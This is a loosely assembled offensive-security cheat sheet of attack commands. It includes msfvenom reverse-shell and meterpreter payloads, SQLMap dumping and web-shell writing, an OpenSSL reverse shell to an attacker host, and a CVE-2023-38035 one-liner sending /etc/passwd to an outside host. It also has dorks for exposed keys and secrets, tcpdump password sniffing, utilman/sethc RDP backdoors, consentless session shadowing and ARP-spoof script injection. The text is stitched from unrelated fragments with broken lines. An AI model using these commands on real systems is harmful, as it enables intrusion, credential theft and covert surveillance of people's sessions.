[ "$TCP_PORTS" ] && sudo nmap -sT -sC -sV -v -Pn -n -T4 -p$TCP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_tcp $MACHINE_IP



##  UDP grab banners and services information
UDP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep udp | cut -d " " -f3 | tr '\n' ',' | head -c -1)


[ "$UDP_PORTS" ] && sudo nmap -sU -sC -sV -v -Pn -n -T4 -p$UDP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_udp $MACHINE_IP


##  
cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce




##  
sniper -f ips.txt -m massweb -w output.txt


##  
sniper -t <IP> -m webscan -w output.txt




##  MSFVenom - Generating Payloads


##  PHP reverse shell payload
msfvenom -p php/reverse_php LHOST=YOURIPADDRESS LPORT=443 > shell.php


##  Windows reverse shellcode for python script buffer overflow
msfvenom -p windows/shell_reverse_tcp LHOST=YOURIPADDRESS LPORT=443 -f c -e x86/alpha_mixed -b "\x00\x04\xcd\x77\x3f"


##  Windows bind shellcode for python script buffer overflow
msfvenom -p windows/shell_bind_tcp LPORT=444 -f c -e x86/shikata_ga_nai -b  "\x00\x04\xcd\x77\x3f"


##  Meterpreter exe with reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOURIPADDRESS LPORT=4444 -f exe > meterpreter.exe
	
	
##  64-bit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.120 LPORT=4444 -f exe > met64.exe


##  WAR file for Apache Tomcat.
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOURIPADDRESS LPORT=443 -f war > shell.war


##  find malicious js file extract shell.war then browse to js file in browser
jar -xvf shell.war


##  Windows MSI
msfvenom -f msi-nouac -p windows/adduser USER=hackerman PASS=password -o add_user.msi


##  Javascript
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.121 LPORT=443 -f js_le


##  Linux elf binary
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.121 LPORT=443 -b "\x00" -f elf -o filename



##  Search ExploitDB for Apache 2.4.7
site:exploit-db.com apache 2.4.7

##   Remove dos-exploits
searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

##   Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'





##-================================-##
##     [+] SQLMap - Easy mode:
##-================================-##
sqlmap --wizard


##-=====================================================-##
##     [+] SQLMap - Capture request with burp & save to request.txt:
##-=====================================================-##
## ------------------------------------------------------------------------------------- ##
##    [?]  you need to authenticate before 
##          you can access vulnerable parameter.
## ------------------------------------------------------------------------------------- ##
sqlmap -r request.txt


##-=========================================-##
##     [+] SQLMap - grab cookie out of burp/proxy
##                              insert into command line option:
##-=========================================-##  
sqlmap -u "http://$IP/index.php?id=1" --cookie "PHPSESSIONID=1234example"


##-================================-##
##     [+] SQLMap - Dump
##-================================-##
sqlmap -u "http://$IP/index.php?id=1" --dbms=mysql -D databasename -T tablename --dump


##-================================-##
##     [+] SQLMap - Crawl
##-================================-##
sqlmap -u http://$IP --dbms=mysql --crawl=3


##-================================-##
##     [+] SQLMap - List databases
##-================================-##
sqlmap -u http://localhost/Less-1/?id=1 --dbs


##-================================-##
##     [+] SQLMap - List tables
##-================================-##
sqlmap -u http://localhost/Less-1/?id=1 -D database_name --tables


##-================================-##
##     [+] SQLMap - List columns
##-================================-##
sqlmap -u http://localhost/Less-1/?id=1 -D database_name -T table_name --columns


##-================================-##
##     [+] SQLMap - Dump all
##-================================-##
sqlmap -u http://localhost/Less-1/?id=1 -D database_name -T table_name --dump-all


##-================================-##
##     [+] SQLMap - Set Cookie
##-================================-##
sqlmap -u http://$Domain/ovidentia/index.php\?tg\=delegat\&idx\=mem\&id\=1 --cookie "Cookie: OV1364928461=6kb5jvu7f6lg93qlo3vl9111f8" --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs


##-================================-##
##     [+] SQLMap - Checking Privileges
##-================================-##
sqlmap -u http://localhost/Less-1/?id=1 --privileges | grep FILE


##-================================-##
##     [+] SQLMap - Reading file
##-================================-##
sqlmap -u $URL --file-read=$File

sqlmap -u http://localhost/Less-1/?id=1 --file-read=/etc/passwd


##-================================-##
##     [+] SQLMap - Writing file
##-================================-##
sqlmap -u $URL --file-write=$File --file-dest=$Path

sqlmap -u http://localhost/Less-1/?id=1 --file-write=shell.php --file-dest=/var/www/html/shell-php.php



##-================================-##
##     [+] SQLMap - Post
##-================================-##
sqlmap -u $URL --data="<POST-paramters> "

sqlmap -u http://localhost/Less-11/ --data "uname=teste&passwd=&submit=Submit" -p uname


##-================================-##
##     [+] SQLMap - use a file for post request:
##-================================-##
sqlmap  -r post-request.txt -p uname


##-============================-##
##     [+] Findomain- SQL Injection:
##-============================-##
findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1






##-===================================-##
##     [+] OpenSSL - Encrypted Reverse Shell
##-===================================-##


##-================================-##
##     [+] OpenSSL - Generate certificate:
##-================================-##
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes


##-========================-##
##     [+] OpenSSL - Listener:
##-========================-##
openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>


##-============================-##
##     [+] OpenSSL - Reverse Shell:
##-============================-##
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s


##-=====================================-##
##     [+] PSQL - search subdomain using cert.sh
##-========≈============================-##
psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep twitch | anew'










https://t.me/incidentresponse
https://t.me/sudapodoshel/2
https://t.me/sudapodoshel/2721
https://t.me/RSTReportHub
https://t.me/LibraLair
https://t.me/avleonovnews
https://t.me/SqlDumps/104
http://t.me/combatosint
https://t.me/BoomSecOfficial
https://t.me/thewhiteh4t




#ShadowBrokers



##-================================-##
##     [+] SMBMap - 
##-================================-##
smbmap --host-file hosts.txt > smbmapresults.txt


##-================================-##
##     [+] SMBMap - 
##-================================-##
smbmap -u domainusername -p 'supersecretpassword' -d domain.local --host-file /home/<user>/Documents/smbmap/hosts.txt > result.txt


##-================================-##
##     [+] SMBMap - 
##-================================-##
smbmap -u domainusername -p 'supersecretpassword' -d domain.local --host-file /home/<user>/mappashares/testdownload/test2.txt -R -A '.\.bat\b'





##-=============================-##
##     [+] GoogleDorks - Search for APIs
##-=============================-##
site:target.tld inurl:api
intitle:"index of" "api.yaml" site:target.tld
intitle:"index of" intext:"apikey.txt" site:target.tld
allintext:"API_SECRET*" ext:env | ext:yml site:target.tld


##-=============================-##
##     [+] GoogleDorks - SQL
##-=============================-##
"index of" "database.sql.zip" | filetype:sql intext:password
ext:sql | ext:dbf | ext:mdb
intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
site:target.com intitle:”index of” db_backup.sql | db.sql | database.sql | sql | .sql.gz | .sql.bz2


##-=============================-##
##     [+] GoogleDorks - WordPress
##-=============================-##
intitle:"Index of" wp-admin



##-=============================-##
##     [+] GoogleDorks - cgi-bin
##-=============================-##
inurl:/cgi-bin/
inurl:/cgi-bin/ + intext:”User ID” + intext:”Password”
inurl:/cgi-bin/login.cgi

Juicy files/Pages

intext:"budget approved") inurl:confidential


##-=============================-##
##     [+] GoogleDorks - Apache2
##-=============================-##
intitle:"Apache2 Ubuntu Default Page: It works"


##-=============================-##
##     [+] GoogleDorks - Zoom Videos
##-=============================-##
inurl:zoom.us/j AND intext:"scheduled for"


##-=============================-##
##     [+] GoogleDorks - SSH private keys
##-=============================-##
intitle:index.of id_rsa -id_rsa.pub
intitle:"Index of /" ".ssh"

##-=============================-##
##     [+] GoogleDorks - email list
##-=============================-##
filetype:xls inurl:"email.xls"

##-=============================-##
##     [+] GoogleDorks - ENV files
##-=============================-##
inurl:.env | filetype:.env | ext:env
filetype:env intext:DB_USERNAME


intitle:"index of"
inurl:"/private"
intitle:"index of" "local.json"
Fwd: intitle:"Index of /" intext:"resource/"
filetype:xls + password + inurl:.com
site:gov.* intitle:"index of" *.pptx
docs.google.com/spreadsheets
"microsoft internet information services" ext:log
inurl:src/viewcvs.cgi/log/.c?=
intitle:"welcome.to.squeezebox"
intitle:"index of" "mysql.properties"
inurl: /wp-content/uploads/ inurl:"robots.txt" "Disallow:" filetype:txt
inurl:"/horde/test.php"
filetype:gitattributes intext:CHANGELOG.md -site:github.com
ext:txt | ext:log | ext:cfg | ext:yml "administrator:500:"
intitle: index of "*db.tar.gz"
inurl:admin filetype:xlsx site:gov.*
Index of" intext:"source_code.zip
inurl:"htaccess|passwd|shadow|htusers"
“config.yml” | intitle:”index of” “config.yml”
intitle:"index of" "config.txt"
inurl:/wp-content/uploads/wpo_wcpdf
intext:"ArcGIS REST Services Directory" intitle:"Folder: /"
allintitle:"macOS Server" site:.edu
inurl:wp-content/uploads/sites
intitle:"index of" "private.properties"
intitle:"SCM Manager" intext:1.60
intitle:"index of" "profiler"
intitle:"index of" "main.yml"
intitle:"Index of" inurl:/backup/ "admin.zip"
intitle:"index of" google-maps-api
intitle:"index of" github-api
inurl:uploadimage.php
intitle: "index of" "/backup.sql"
intitle:"Sharing API Info"
inurl:user intitle:"Drupal" intext:"Log in" -"powered by"
inurl: /libraries/joomla/database/
"web.config" | inurl:/conf/ | "error_log"
intitle:"Index of /" + ".htaccess"
intitle:"index of /.git" "paren directory"
inurl:Makefile.toml


##-=============================-##
##     [+] GoogleDorks - Govermment docs
##-=============================-##
allintitle: restricted filetype:doc site:gov

##-=============================-##
##     [+] GoogleDorks - PDFs
##-=============================-##
intitle: index of pdf | ext:pdf | inurl:.pdf
filetype:pdf “Confidential” | “Secret” | “Classified”




##-========================-##
##     [+] ATScan - 
##-========================-##
atscan --dork "site:gov.il ext:txt|xlsx|csv" --motor google --level 5 



##-========================-##
##     [+] httpx - Extract and Probe all the ips associated with same host
##-========================-##
httpx -l /root/urls.txt -pa -o urls_ips.txt


##-========================-##
##     [+] 
##-========================-##
Extract the IPS
github.com/emadshanab/Ext…


##-========================-##
##     [+] httpx - Scan all ports
##-========================-##
httpx -l ips.txt -ports - -o ips_ports.txt

nuclei -l ips_ports.txt -t nuclei-templates



##-========================-##
##     [+] httpx - Extract Sensitive Informations on /auth.json Endpoint
##-========================-##
subfinder -d $Domain | httpx -path "/auth.json" -title -status-code -content-length -t 80 -p 80,443,8080,8443,9000,9001,9002,9003



[SecDevOps]-Toolkit-[Technical-Attacks].md



##-========================-##
##     [+] httpx - Time-based SQLi in sitemap.xml 
##-========================-##
cat urls | httpx -silent -path 'sitemap.xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10'


github.com/thecybertix/


##-========================-##
##     [+] One-liners & Quick Wins
##-========================-##


##-========================-##
##     [+] Grep emails and other PII Data from URLs file
##-========================-## 
grep -E -o '\\\\\\\\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\\\\\.[a-zA-Z]{2,}\\\\\\\\b' urls.txt


##-========================-##
##     [+] Extract Endpoints from JavaScript
##-========================-##
cat FILE.js | grep -oh "\\\\\\\\"\\\\\\\\/[a-zA-Z0-9_/?=&]&\\\\\\\\""| sed -e 's/^"//' -e 's/"$//' | sort -u


##-========================-##
##     [+] Get CIDR & Org Information from Target Lists
##-========================-##
for HOST in $(cat HOSTS.txt); do echo (for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\\\\\\\\|Organization" | tr -s " | paste -; done | uniq); done


##-========================-##
##     [+] Prototype Pollution
##-========================-##
subfinder -d HOST -all -silent ❘ httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\\\\\\\\/?_proto_[testparam]=exploit\\\\\\\\//' FILE.txt | page- fetch -j 'window.testparam == "exploit"? "[VULNERABLE]": "[NOT VULNERABLE]" | sed "s/(//g" sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"


##-========================-##
##     [+] Sitemap SQL Injection
##-========================-##
cat urls.txt | httpx -silent -path 'sitemap.xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10'


##-========================-##
##     [+] Authentication Bypass (CVE-2022-40684) POC
##-========================-##
##   [?]  https://twitter.com/h4x0r_dz/status/1580648642750296064/photo/1>

ffuf -w "host_list.txt:URL" -u "<https://URL/api/v2/cmdb/system/admin/admin>" -X PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by=”[127.0.0.1]:9000";' -d '{"ssh-public-key1": "h4x0r"}' -mr "SSH" -r


##-========================-##
##     [+] CVE-2023-26256
##-========================-##

##   [?] https://github.com/aodsec/CVE-2023-26256

git clone https://github.com/aodsec/CVE-2023-26256.git
python3 CVE-2023-26256.py -h


##-========================-##
##     [+] CVE-2023-38035 - Unauth. RCE
##-========================-##
python3 -c "from pyhessian.client import HessianProxy as H; H('https://TARGET-DOMAIN:8443/mics/services/MICSLogService').uploadFileUsingFileInput({'command': 'curl -X POST -d @/etc/passwd [BURP-COLLABORATOR-URL.com](https://burp-collaborator-url.com/)', 'isRoot': True}, None)"


##-========================-##
##     [+] Quick Port Scanning with Fuzzing
##-========================-##
cat ips.txt|naabu -silent -tp 1000 -o top1k.txt;cat top1k.txt|grep -vE ':80|:443' | httpx -silent -fc 400,503,204,405 -o httpx.txt;cat httpx.txt|python3 [dirsearch.py](https://dirsearch.py/) --stdin -e '*' -t 60 -w onelistforall.txt -i 200,301,302 --format plain -o report.txt


##-========================-##
##     [+] SSRF use Autorize Exxtension Match and replace
##-========================-## 
https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)



##-=================-##
##      [+] Waf Detect
##-=================-##
nuclei -l urls.txt -t nuclei_templates/waf
wafw00f -l urls.txt



##-========================-##
##     [+] 
##-========================-##
photon -u https://$Domain -l 3 -t 100 --wayback








##  Show DNS traffic
tcpdump -i <interface> -nn -l udp port 53

 
##  Show HTTP User-Agent & Hosts
tcpdump -i <interface> -nn -l -A -s1500 | egrep -i 'User-Agent:|Host:'


##   Show HTTP Requests & Hosts
tcpdump -i <interface> -nn -l -s 0 -v | egrep -i "POST /|GET /|Host:"


##  Show email recipients
tcpdump -i <interface> -nn -l port 25 | egrep -i 'MAIL FROM\|RCPT TO'


##  Show FTP data
tcpdump -i <interface> -nn -v port ftp or ftp-data


##  Show all passwords different protocols
tcpdump -i wlan0 port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '




### Virtual Machines

> Based on the Shadow Bunny technique.

ps1
# download virtualbox
Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe

# perform a silent install and avoid creating desktop and quick launch icons
VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0

# in \Program Files\Oracle\VirtualBox\VBoxManage.exe
# Disabling notifications
VBoxManage.exe setextradata global GUI/SuppressMessages "all" 

# Download the Virtual machine disk
Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd

# Create a new VM
$vmname = "IT Recovery"
VBoxManage.exe createvm --name $vmname --ostype "Ubuntu" --register

##-=========================-##
##    [+]  Add a network card in NAT mode
##-==============================-##
VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit
VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128
VBoxManage.exe modifyvm $vmname --nic1 nat
VBoxManage.exe modifyvm $vmname --audio none
VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
VBoxManage.exe modifyvm $vmname --description "Shadowbunny"

Mount the VHD file
VBoxManage.exe storagectl $vmname -name "SATA Controller" -add sata
VBoxManage.exe storageattach $vmname -comment "Shadowbunny Disk" -storagectl "SATA Controller" -type hdd -medium "$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd" -port 0

# Start the VM
VBoxManage.exe startvm $vmname –type headless 


##-=================================-##
##    [+]  Adding optional shared folder
##    [+]  Require: VirtualBox Guest Additions
##-==================================-##
VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\ -automount


mount the folder in the VM
sudo mkdir /mnt/c
sudo mount -t vboxsf shadow_c /mnt/c



### RDP Backdoor

#### utilman.exe

At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.

powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f


#### sethc.exe
 
Hit F5 a bunch of times when you are at the RDP login screen.

powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f


### Remote Desktop Services Shadowing

:warning: FreeRDP and rdesktop don't support Remote Desktop Services Shadowing feature.

Requirements:
* RDP must be running

powershell
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4
# 4 – View Session without user’s permission.

# Allowing remote connections to this computer
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f


# Disable UAC remote restriction
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt
# /v parameter lets specify the {ADDRESS} value that is an IP address or a hostname of a remote host;
# /shadow parameter is used to specify the {SESSION_ID} value that is a shadowee’s session ID;
# /noconsentprompt parameter allows to bypass a shadowee’s permission and shadow their session without their consent;
# /prompt parameter is used to specify a user’s credentials to connect to a remote host.





##-===============================-##
##    [+]  Tunneling & Port Forwarding:
##    [+]     SSH over HTTP (Squid):
##-===============================-##


##-====================================-##
##     [+]  Socat - SSH over HTTP (Squid):
##-====================================-##
socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128

ssh john@127.0.0.1 -p 9999


##-====================================-##
##     [+]  ProxyTunnel - SSH over HTTP (Squid)
##-====================================-##
proxytunnel -p 192.168.1.41:3128 -d 127.0.0.1:22 -a 5555

ssh john@127.0.0.1 -p 5555


##-====================================-##
##     [+]  ProxyChains - SSH over HTTP (Squid)
##-====================================-##
http 192.168.1.41 3128

proxychains ssh john@127.0.0.1


##-====================================-##
##     [+]  Corkscrew - SSH over HTTP (Squid)
##-====================================-##
ssh john@192.168.1.41 -t /bin/sh







Top 10 sources from a tcpdump capture:
tcpdump -nr dumpfile | cut -f3 -d’ ‘ | cut -f1-4 -d’.’ |
sort | uniq -c | sort -nr | head -10


Top 10 referrers from Apache access log:
cat access_log | cut -d’ ‘ -f11 | cut -d ‘/’ -f3 | sort |
uniq -c | sort -nr | head -10



grep -a “needle” file same, but treat binary file like ASCII
grep -c “needle” file count lines that contain “needle”
grep -v “needle” file return lines that DO NOT contain “needle”
grep “needle” file extract all lines that contain “needle” from
file

cut -f 1 -d ‘ ‘ cut the first column from a file Consider
space ( ) as delimiter





find large files find -size +5000k -xdev -print
Kill Process wmic process [pid] delete
wmic process where name=ʼcmd exeʼ delete
List local users wmic useraccount list full
Startup Programs wmic startup list full



use wmic on remote system: wmic /user:userID /password:password /
node:hostname share list full





Identify Rogue Processes
pslist High-level view of running processes

vol.py pslist


psscan Scan memory for EPROCESS blocks
vol.py psscan


pstree Display parent-process relationships
vol.py pstree


Identify Rogue Processes
dlllist List of loaded dlls by process
-p Show information only for specific processes (PIDs)
# vol.py dlllist –p 1022,868
getsids Print process security identifiers
-p Show information only for specific PIDs
# vol.py getsids –p 868
handles List of open handles for each process
-p Show information only for specific PIDs
-t Display only handles of a certain type
{Process, Thread, Key, Event, File, Mutant, Token, Port}
# vol.py handles –p 868 –t File,Key



Network Artifacts
netscan Scan for TCP connections and sockets
# vol.py netscan



Look for Evidence of Code Injection
malfind Find injected code and dump sections
-p Show information only for specific PIDs
-v Verbose: show full paths from three DLL lists
# vol.py ldrmodules –p 868 -v




Volatility
vol.py –h Show options and supported plugins
vol.py plugin –h Show plugin usage
vol.py plugin --info Show available OS profiles


Sample Command Line
vol.py -f image --profile=profile plugin
Identify System Profile


imageinfo Display memory image metadata
vol.py –f mem.img imageinfo


Using Environment Variables
Set name of memory image Takes place of -f

export VOLATILITY_LOCATION=file:///images/mem.img


Set profile type Takes place of --profile=
export VOLATILITY_PROFILE=Win10x64_14393





if (ip.proto == TCP && tcp.src == 80) {
   replace("</head>", "<script src=http://'"$IP"':'"$PORT"'/hook.js></script></head>");
   msg("Beef Hook: '"$IP"':'"$PORT"'/hook.js Injected!\n");
}' > etter.filter.jsinject

xterm -e "ferret -i $NIC"&
xterm -e "urlsnarf -i $NIC"&
etterfilter etter.filter.jsinject -o jsinject.ef 2> /dev/null
sleep 4 && echo " [*] Beef Hook: http://$IP:$PORT/hook.js" && echo " [*] Filter Activated, waiting for requests..." && echo " [*] Press 'q' to quit" && echo&
if [ $TARG -z ] 2> /dev/null
then
	ettercap -i $NIC -P autoadd -TqF jsinject.ef -M ARP // //
else
	ettercap -i $NIC -TqF jsinject.ef -M ARP /$TARG/ //
fi




function get_api_token {

  echo -e "${INFO} Getting API token"

  # shellcheck disable=SC2086
  api_token=$(curl -s -H "Content-Type: application/json" \
        -d '{"username":"'${username}'", "password":"'${password}'"}' \
        -X POST "http://${beef_ip}:${beef_port}/api/admin/login" \
        | awk -F '"' '{print $6}')
        # HTTP hack

  if [ -z "${api_token}" ]; then

    echo "${FATAL} Failed to get API token"
    echo "${INFO} Check BeEF is running"
    echo "${INFO} Check BeEF username/password"
    echo "${INFO} Check BeEF ip and port are correct"
    return 1
  else 
    echo -e "${PASS} Successfully got API token"
    return 0
  fi
}


BEEFPID=`ps ux | awk '/ruby .*beef/ && !/awk/ { print $2 }'`
http://public-ip:3000/ui/panel




datetaken=$(exiftool -s3 '-CreateDate' -d '%Y-%m-%d' "${file}")
    yeartaken=$(exiftool -s3 '-CreateDate' -d '%Y' "${file}")
datetaken=$(exiftool -s3 '-DateTimeOriginal' -d '%Y-%m-%d' "${file}")
    yeartaken=$(exiftool -s3 '-DateTimeOriginal' -d '%Y' "${file}")


find "${1}" -type f -iregex ".*\.\(thm\|cpi\)"


xdpyinfo -display :${NEW_DISPLAY} 2>&1
vncserver ":${NEW_DISPLAY}" -localhost -geometry 1600x1200 -depth 16
export DISPLAY=:${NEW_DISPLAY}
vncserver -kill ":${NEW_DISPLAY}"




https://github.com/EdOverflow/bugbounty-cheatsheet
https://github.com/projectdiscovery/dnsx
https://github.com/infosec-au/altdns
https://github.com/RoliSoft/ReconScan
https://github.com/carlospolop/legion
https://github.com/mostaphabahadou/postenum
https://hunter.io/
https://github.com/Findomain/Findomain

https://github.com/bugcrowd/templates


https://github.com/x0rz/EQGRP

https://github.com/wsargent/docker-cheat-sheet

https://github.com/vitalysim/Awesome-Hacking-Resources

https://github.com/s0md3v/AwesomeXSS

https://github.com/threatexpress/red-team-scripts

https://github.com/sektioneins/pcc/wiki

https://github.com/sergey-pronin/Awesome-Vulnerability-Research

https://github.com/onlurking/awesome-infosec

https://github.com/NoorQureshi/kali-linux-cheatsheet

https://github.com/nnamon/linux-exploitation-course

https://github.com/meirwah/awesome-incident-response

https://github.com/leostat/rtfm

https://github.com/kbandla/APTnotes

https://github.com/FuzzySecurity/Resource-List

https://github.com/emilyanncr/Windows-Post-Exploitation

https://github.com/FabioBaroni/awesome-exploit-development

https://github.com/enddo/awesome-windows-exploitation

https://github.com/enaqx/awesome-pentest

https://github.com/dostoevskylabs/dostoevsky-pentest-notes

https://github.com/EdOverflow/bugbounty-cheatsheet


##-========================-##
##     [+] 
##-========================-##
 Password Cracking
 
 
 
##-========================-##
##     [+] Cracking Zip Archives:
##-========================-##
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip 


Cracking /etc/shadow
##-========================-##
##     [+] 
##-========================-##

unshadow passwd shadow > passwords
john --wordlist=/usr/share/wordlists/rockyou.txt passwords



##-========================-##
##     [+] 
##-========================-##
- keepass 


keepass2john /root/Desktop/NewDatabase.kdb > file
john -incremental:alpha -format=keepass file

##-========================-##
##     [+] 
##-========================-##
- Bruteforce Salted


for j in $(cat cipher); do 
echo $j; 
for i in $(cat digestion); 
do /root/Documents/HTB/Hawk/bruteforce-salted-openssl/bruteforce-salted-openssl -t 10 -f /usr/share/wordlists/rockyou.txt -c $j -d $i ../miau.txt -1 2>&1 | grep "candidate" ; done ; done


openssl aes-256-cbc -d -in ../miau.txt -out result.txt -k friends



https://github.com/frizb/Hashcat-Cheatsheet




https://github.com/kobs0N/Hacking-Cheatsheet/tree/master/CobaltStrike

https://gist.github.com/jeremypruitt?page=4

https://gist.github.com/jeremypruitt/66eb1f65a4b6599f560de30ca7b5fdea

https://gist.github.com/jeremypruitt/c041d355514a8762ababf6458f7b26fd

https://gist.github.com/jeremypruitt/6bea3bfa10b5aabd288099ca8115b463

https://gist.github.com/jeremypruitt/3716b90e722dd1c61dd32c77bfdab22d

https://github.com/Ignitetechnologies/Web-Application-Cheatsheet

https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets

https://gist.github.com/tuxfight3r/9ac030cb0d707bb446c7

https://gist.github.com/jforge/27962c52223ea9b8003b22b8189d93fb

https://gist.github.com/githubfoam/4d3c99383b5372ee019c8fbc7581637d
